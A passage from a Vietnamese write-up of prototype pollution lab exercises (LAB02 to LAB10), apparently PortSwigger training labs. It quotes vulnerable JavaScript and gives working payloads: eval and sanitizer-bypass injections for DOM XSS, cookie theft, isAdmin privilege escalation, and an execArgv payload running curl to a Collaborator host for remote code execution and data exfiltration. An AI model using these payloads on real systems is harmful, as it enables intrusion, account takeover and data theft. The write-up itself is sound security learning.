Tiếp theo mình tìm source mà có thể sử dụng. 

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

window.addEventListener("load", searchLogger);
``` 

Chức năng `searchLogger()` thì tạo 1 Object `window.macros` bằng rỗng. 
Và `window.manager` có `params` là key chứa toàn bộ tham số trên URL. 
Vì ở trên có hàm `logQuery` nó thực hiện `fetch` tới URL để lấy toàn bộ tham số ví dụ: `...search=hello&page=2` thì nó sẽ là `search` và `page`. 

Và trong `window.manager` chứa `macros` hiện thì là rỗng. 

Dòng `let a = manager.sequence || 1; manager.sequence = a + 1;`
- Nếu chưa có -> bắt đầu bằng 1
- Sau đó tăng lên -> giống như số lần người dùng thực hiện thao tác. 

Sau đó, nó gọi tới hàm `eval()`. Như vậy `sink` nằm ngay tại hàm `eval` này. Xem kỹ thì trong `manager` ko hoàn toàn định nghĩa `sequence` cho nên khi mình truyền thì mình có thể kiểm soát `sequence`.

![image](https://hackmd.io/_uploads/S1_YIXBsll.png)

Nhưng nó ko hoàn toàn đưa ra alert. Quan sát trong console thì nó báo mình bị SyntaxError 

![image](https://hackmd.io/_uploads/Bk2sIQBsxg.png)

Cho nên mình sẽ tiến hành debug. 

![image](https://hackmd.io/_uploads/Hy-RUmHjxe.png)

Khi này thì `manager.sequence` là `alert(origin)` Và khi tiến hành cộng thì do `manager.squence` là string cho nên nó sẽ tiến hành cộng chuỗi. 

![image](https://hackmd.io/_uploads/HyFMvmSjlx.png)

Vì vậy khi đó chạy xuống hàm `eval()` sẽ là:

![image](https://hackmd.io/_uploads/SJANv7Sogl.png)

Hoàn toàn gây ra lỗi syntax 

Cho nên payload của mình là: `?__proto__.sequence=alert(origin)-` Khi đó chạy tới `eval` thì do `alert(origin)-1` là một biểu thức hợp lệ nên nó sẽ thực thi. 

![image](https://hackmd.io/_uploads/SJMpD7Sjgx.png)

Còn một payload nữa nhận ra khi nó truyền vào trong câu lệnh `manager.macro` là cộng chuỗi nên mình có thể inject `);alert(origin)}//`

![image](https://hackmd.io/_uploads/By3mdXHolg.png)

**Cách DOM invader**

Cũng tương tự như lab trên thì mình cũng phát hiện ra như sau: 

![image](https://hackmd.io/_uploads/B1BhO7Hsle.png)

Sau đó, chọn scan target. 

![image](https://hackmd.io/_uploads/H1ECOQHsgx.png)

Scan xong thì thấy hoàn toàn dính vuln nên là chọn `exploit`, nhưng nó sẽ ko hoàn toàn chạy được vì nó cũng chỉ đưa payload cơ bản cũng sẽ lỗi syntax nên là mình phải thêm dấu `-`

![image](https://hackmd.io/_uploads/S16Ht7Boll.png)

## LAB03 - Client-side prototype pollution via flawed santization 

Ở lab, mình sẽ phải vượt qua cách mà dev đã chặn các từ khóa quan trọng. 

Quan sát trong source thì thấy như sau: 

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}

window.addEventListener("load", searchLogger);
```

Nhìn thấy có hàm `sanitizeKey` qua các từ khóa quan trọng `constructor`, `__proto__`, `prototype`
Nhưng cách này mình hoàn toàn có thể bypass 1 cách dễ dàng nếu mình truyền: 
- `__pro__proto__to__[foo]=bar` hoặc `__pro__proto__to__.foo=bar`
- `constconstructorructor[protoprototypetype][foo]=bar` hoặc `constconstructorructor.protoprototypetype.foo=bar`

![image](https://hackmd.io/_uploads/SJozZpwjgl.png)

Từ đây xác nhận là nó dính **prototype pollution**, như vậy giờ mình tìm gadget nữa là được.

Quan sát, source js thì thuộc tính `transport_url` tạo ra thẻ `<script>` nhưng mà nó ko được định nghĩa trong object `config`. Nhưng vậy nếu mình tiêm vào trong **prototype** có thuộc tính `transport_url` thì hoàn toàn có thể thực thi DOM XSS.

![image](https://hackmd.io/_uploads/H12rGaPsxg.png)

![image](https://hackmd.io/_uploads/rk4DMpDjlg.png)

## LAB04 - Client-side prototype pollution in third-party libraries 

Mình sẽ bật **DOM invader** thì nó phát hiện ra như sau: 

![image](https://hackmd.io/_uploads/BkRhOavjgx.png)

Sau khi scan thì nó phát hiện ra: 

![image](https://hackmd.io/_uploads/SyQWKpviel.png)

Thông qua sink `setTimeout()`, sau đó gọi tới `hitCallBack`

![image](https://hackmd.io/_uploads/ryKrYaDoxg.png)

Nó sẽ in ra thông báo `1` sau đó, mình thay lại để in ra `document.cookie` rồi sau đó mình gửi tới client. 

![image](https://hackmd.io/_uploads/rkNuF6Dill.png)

## LAB05 - Client-side prototype pollution via browser APIs

Mình xác định web này có lỗ hổng dì hong 

![image](https://hackmd.io/_uploads/HyqNSVYiex.png)

Xem xét trong source có file `searchLogger.js`

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
``` 

Quan sát thì thấy có dùng `Object.defineProperty()` nhưng nó ko hoàn truyền value vào trong. Nên nếu mình truyền `__proto__[value]=bar`

![image](https://hackmd.io/_uploads/HkKJLNtjxx.png)

Nó đã tạo ra 1 thẻ `script`

Vì trong file `param.js`

```javascript
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );
            keys = keys.shift().split('[').concat( keys );
            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[key] = i < keys_last
                        ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[key].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[key] = [ obj[key], val ];
                } else {
                    obj[key] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
``` 

hàm này dùng để parse trên url lấy tham số. 

![image](https://hackmd.io/_uploads/S1AS8NFsgl.png)

## LAB06 - Privilege escalation via server-side prototype pollution 

Quan sát lab này mình sẽ tìm **prototype pollution** trên phía server. 

Sau khi login vào thì mình được gọi 1 endpoint là `POST /my-account/change-address` thì mình thử inject vào như sau: 

![image](https://hackmd.io/_uploads/HkBN3WFsxl.png)

Thấy inject của mình được in ra trong response, và quan sát thì thấy có thuộc tính `isAdmin` thì mình được set false, nên mình sẽ sửa lại. 

![image](https://hackmd.io/_uploads/B1wdhZYsgg.png)

Như vậy, sau đó mình có thể truy cập Admin Panel. 

![image](https://hackmd.io/_uploads/B1RK2bYslg.png)

## LAB07 - Detecting server-side prototype pollution without polluted property reflection 

Lab này bị **prototype pollution** nhưng nó sẽ ko phản chíu lại trong response. 

![image](https://hackmd.io/_uploads/Sy4SWXtjxx.png)

Cho nên mình sẽ thử phá syntax xem có gây lỗi hay ko? 

![image](https://hackmd.io/_uploads/Hkuw-XFjgl.png)

Mình nhìn thấy có `statusCode:555` và `status:555` mặc dù nhận Status code là `500` nên mình thử inject key `status`

![image](https://hackmd.io/_uploads/B1JyGXtoxl.png)

Như vậy mình có thể đã **prototype polluted**

## LAB08 - Bypassing flawed input filters for server-side prototype pollution 

Ở lab này sau khi đã thử inject `status` bằng `__proto__` nhưng ko ảnh hưởng, nhưng khi inject bằng **constructor** thì có hiệu quả:

![image](https://hackmd.io/_uploads/SkkoBmYsex.png)

Nhưng bài này, cần phải leo quyền thành `admin`. 

![image](https://hackmd.io/_uploads/rksnH7tole.png)

Chuyển sang dạng Raw 

![image](https://hackmd.io/_uploads/ByX0r7Yigg.png)

Nó có sự thay đổi -> thay đổi thành key `isAdmin`

![image](https://hackmd.io/_uploads/HkjgImKsxg.png)

Truy cập được vào `Admin Panel`

![image](https://hackmd.io/_uploads/HkEfLXYiex.png)

## LAB09 - RCE via server-side prototype pollution 

Ở lab mình xác định prototype pollution qua json spaces

![image](https://hackmd.io/_uploads/HyhYJNKoee.png)

Đổi sang Raw 

![image](https://hackmd.io/_uploads/Hk59kNFsee.png)

Quan sát trong Admin panel thì nó có `maintenance job` 

![image](https://hackmd.io/_uploads/rkd1gVtsxl.png)

Khi click và sau đó quan sát: 

![image](https://hackmd.io/_uploads/SkvQgEKsgg.png)

Nó thực hiện để `db-cleanup` và `fs-cleanup`

Suy đoán thì khi ấn nút thì nó spawn node child process. Mình cố gắng pollute prototype thông qua thuộc tính `execArgv` sau đó thêm `--eval` để chạy child process. 

Dùng sink `execSync()`, để tương tác với Burp Collaborator server. 

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

Như vậy sẽ thêm vào như sau: 

![image](https://hackmd.io/_uploads/Sy6rX4Kjxx.png)

Sau đó, mình cho nó chạy maintaing job để có thể gọi tới child_process. 

![image](https://hackmd.io/_uploads/HJUI74Fsxl.png)

Quan sát ở tab DNS thì thấy có query trả về. 

![image](https://hackmd.io/_uploads/B1AwQNKoeg.png)

Như vậy mình truyền vào lệnh để xóa file. 

## LAB10 - Exfiltrating sensitive data via server-side prototype pollution 

Mình phát hiện ra prototype pollution thông qua `json spaces`

![image](https://hackmd.io/_uploads/r1wj5NYjel.png)

![image](https://hackmd.io/_uploads/SyghqNKsgg.png)

Quan sát trong tab admin thì mình vẫn nút để gợi chạy process con. 
Cho mình truyền vào như sau: 

![image](https://hackmd.io/_uploads/SyOQoEYole.png)

Quan sát trong tab DNS 

![image](https://hackmd.io/_uploads/r1dBsEtigg.png)

Như vậy mình có leak data thông qua DNS 

![image](https://hackmd.io/_uploads/ryLnoNtogg.png)

![image](https://hackmd.io/_uploads/H1mToEFsge.png)

Quan sát thấy có file `secret` -> nên mình sẽ đọc

![image](https://hackmd.io/_uploads/r1wQ24Fsxx.png)

Như vậy là đã leak data thành công

